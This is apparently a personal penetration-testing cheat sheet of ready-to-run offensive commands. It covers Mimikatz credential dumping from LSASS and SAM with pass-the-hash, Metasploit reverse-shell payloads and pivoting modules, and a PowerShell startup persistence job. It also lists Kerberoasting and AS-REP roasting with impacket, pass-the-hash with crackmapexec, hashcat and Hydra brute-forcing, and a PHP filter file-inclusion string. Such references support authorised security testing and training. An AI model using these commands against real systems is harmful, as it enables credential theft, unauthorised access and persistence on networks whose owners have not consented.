# Mimikatz
## Setup
### Get debug privilege
```
debug::privilege
```
### Impersonate system
```
token::elevate
```

## Credentials collecting
### LSASS
```
lsadump::lsa /patch
```
### SAM
```
lsadump::sam
```
### Logged in users
```
sekurlsa::logonpasswords
```

## Misc
### Pass the hash
```
sekurlsa::pth /user: /domain: /ntlm: /run:powershell
```

# Metasploit
## Payloads
### Staged
- ```windows/meterpreter/reverse_tcp```
- ```windows/shell/reverse_tcp```
- ```linux/x86/meterpreter/reverse_tcp```
- ```linux/x86/shell/reverse_tcp```
- ```linux/x64/meterpreter/reverse_tcp```
- ```linux/x64/shell/reverse_tcp```
### Stageless
- ```windows/meterpreter_reverse_tcp```
- ```windows/shell_reverse_tcp```
- ```linux/x86/meterpreter_reverse_tcp```
- ```linux/x86/shell_reverse_tcp```
- ```linux/x64/meterpreter_reverse_tcp```
- ```linux/x64/shell_reverse_tcp```

## Remote session wrappers
### SSH
```
auxiliary/scanner/ssh/ssh_login
```
### SMB
```
auxiliary/scanner/smb/smb_login
```
## Pivoting
- ```post/multi/manage/autoroute```
- ```auxiliary/server/socks_proxy```


# Powershell
## Scheduled jobs
### Register
```powershell
$trigger = New-JobTrigger -AtStartup -RandomDelay 00:00:30
Register-ScheduledJob -Trigger $trigger -FilePath "" -Name ""
```
### List
```powershell
Get-ScheduledJob
```
### Unregister 
```powershell
Unregister-ScheduledJob -Name "" -Force
```

## Misc
### Download
```powershell
Invoke-WebRequest -Uri "" -OutFile ""
```

# AD Enumeration/Exploitation
## crackmapexec
### Enumerating PTH
```bash
crackmapexec smb ip -u user -d domain -H hash
```

## Kerbrute
### Enum usernames
```bash
kerbrute userenum --dc domain controller -d domain -o logfile usernameslist
```

## impacket
### Get SPNs
```bash
./GetUserSPNs.py -dc-ip domain controller -request domain/user:password
```
### Get kerberoastable users
```bash
./GetNPUsers.py domain/ -no-pass -usersfile file
./GetNPUsers.py domain/user:password
```
### Request TGT (disabled pre-auth)
```bash
./GetNPUsers.py domain/user -no-pass
```


# Hashcat
### Bruteforce
```bash
hashcat -m 1000 -a 3 -w 4 -1 ?l012345 -i hash.txt
```

### Charsets
```
?l = abcdefghijklmnopqrstuvwxyz
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
?d = 0123456789
?h = 0123456789abcdef
?H = 0123456789ABCDEF
?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
?a = ?l?u?d?s
?b = 0x00 - 0xff
```



### KRB5TGS
```
13100
```
### NTML
```
1000
```

# Hydra
### Attack POST form
```bash
hydra -l login -P pass.txt example.com http-post-form "/admin/login:username=^USER^&pass=^PASS^:F=login failed"
```

# Misc
### PHP filter
```php://filter/convert.base64-encode/resource=```
### Blank LM hash
```aad3b435b51404eeaad3b435b51404ee```
### xfreerdp
```bash
xfreerdp /u: /p: /d: /v:
```
